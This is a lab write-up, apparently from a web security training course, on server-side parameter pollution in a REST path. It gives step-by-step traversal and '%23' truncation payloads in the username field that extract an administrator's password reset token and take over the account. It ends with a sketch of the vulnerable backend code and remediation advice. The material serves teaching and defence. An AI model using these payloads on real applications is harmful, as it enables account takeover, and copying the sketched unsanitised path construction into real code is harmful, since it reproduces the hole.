## Lab Information

**Topic:** API testing

**Difficulty:** Expert

## Lab Description

This lab demonstrates **Server-Side Parameter Pollution (SSPP) in a REST URL**, where user input included in a POST parameter (`username`) is used to construct a backend REST path. By injecting directory traversal sequences (`../`) and URL-encoded characters (`%23` for `#`), the
attacker can override the server-side request path, discover the API specification, enumerate internal fields, extract the administrator's password reset token, reset their password, log in, and delete **carlos**.

## Vulnerability Analysis

The vulnerability is caused by:

- User input being concatenated directly into REST paths.
- Lack of normalization or sanitization of directory traversal (`../`) or truncation (`#`).
- Internal API responses leaking API structure.
- Exposed API specification accessible via traversal.
- Backend using user input to route internal REST API calls.
- No authentication protecting field enumeration.
- Poor separation between external API and internal API layers.

This allows attackers to pivot from SSPP → API discovery → field enumeration → credential reset token extraction.

## Exploitation Steps

1. Identify endpoints with user-controlled parameters
    
    Only three endpoints contained manipulable parameters:
    
    `GET /product?productId=1`
    
    `POST /login`
    
    `POST /forgot-password`
    
2. Brute-force each endpoint
Using Burp Intruder with **Fuzzing -- path traversal (single file)**:
`productId` (GET /product)
`username` (POST /login)
`username` (POST /forgot-password)
Only `/forgot-password` produced meaningful responses, including status **500** with a distinct HTML error page---indicating server-side URL construction using the parameter.
3. Use directory traversal to reach API specification
    
    Initial attempts using:
    
    ```jsx
    ../api
    ../../api
    ...
    ../openapi.json
    ../../openapi.json
    ...
    ../swagger/index.html
    ../../swagger/index.html
    ...
    ```
    
    returned 500 errors with no new information.
    
4. Apply truncation using `%23` (hashtag)
    
    Truncation payloads like:
    
    ```jsx
    ../api%23
    ../../api%23
    ...
    ../openapi.json%23
    ../../openapi.json%23
    ...
    ../swagger/index.html%23
    ../../swagger/index.html%23
    ...
    
    ```
    
    Several payloads yielded a 500 response with a different length, revealing API specification containing:
    
    ```jsx
    /api/internal/v1/users/{username}/field/{field}
    ```
    
    This is the breakthrough.
    
5. Query fields from internal API
    
    Testing invalid field:
    
    ```jsx
    username=../users/administrator/field/aaa%23
    ```
    
    → Error
    
    Testing valid "email":
    
    ```jsx
    username=../users/administrator/field/email%23
    ```
    
    → Returned masked email address.
    
    Tried API v2:
    
    ```jsx
    username=../../v2/users/administrator/field/username%23
    ```
    
    → Error: only email allowed.
    
    Tried API v1 explicitly:
    
    ```jsx
    username=../../v1/users/administrator/field/username%23
    ```
    
    → Worked.
    
6. Identify reset token field
    
    Initial guesses failed:
    
    `token`
    
    `resetToken`
    
    `reset`
    
    `reset-token`
    
    But let’s recall - we have the JavaScript file `/static/js/forgotPassword.js` that reveals correct parameter and path:
    
    ```jsx
    window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    ```
    
7. Extract the admin's password reset token
    
    ```jsx
    username=../../v1/users/administrator/field/passwordResetToken%23
    ```
    
    Response returned:
    
    ```jsx
    {"type":"passwordResetToken","result":"<token>"}
    ```
    
8. Complete the reset flow
    
    Navigate to:
    
    ```jsx
    /forgot-password?passwordResetToken=<token>
    ```
    
    Set a new password.
    
9. Log in as administrator
    
    Then open the Admin panel → Delete **carlos**.
    
    Lab solved.

## AppSec Perspective

### **What the underlying code might be**

A simplified backend implementation might look like:

```python
@app.post("/forgot-password")
def forgot_password():
    username = request.form.get("username")

    # ! User input inserted directly into backend REST path !
    internal_url = f"/api/internal/v2/users/{username}/field/email"

    # ! No path normalization or sanitization !
    response = requests.get(INTERNAL_API_HOST + internal_url)

    return response.text
```

### **Security issues enabling exploitation**

- Direct insertion of user input into REST URL
- Directory traversal not filtered (`../`)
- Encoded hash `%23` truncates server-side path
- Exposed API spec
- No access control on field enumeration
- Reset token retrievable without verification
- Verbose server-side error messages leak routing internals

### **How to fix it**

**Strict input normalization**

Reject non-alphanumeric usernames.

**Build URLs safely using parameter binding**

```python
requests.get(INTERNAL_API, params={"username": clean_username})
```

**Restrict internal endpoints**

Only allow querying: - `/field/email` -
`/field/pre-approved-fields-only`

**Require authentication on internal APIs**

Reset tokens must *never* be retrieved via API.

**Hide API documentation from unauthenticated users.**

**Remove verbose internal error responses.**
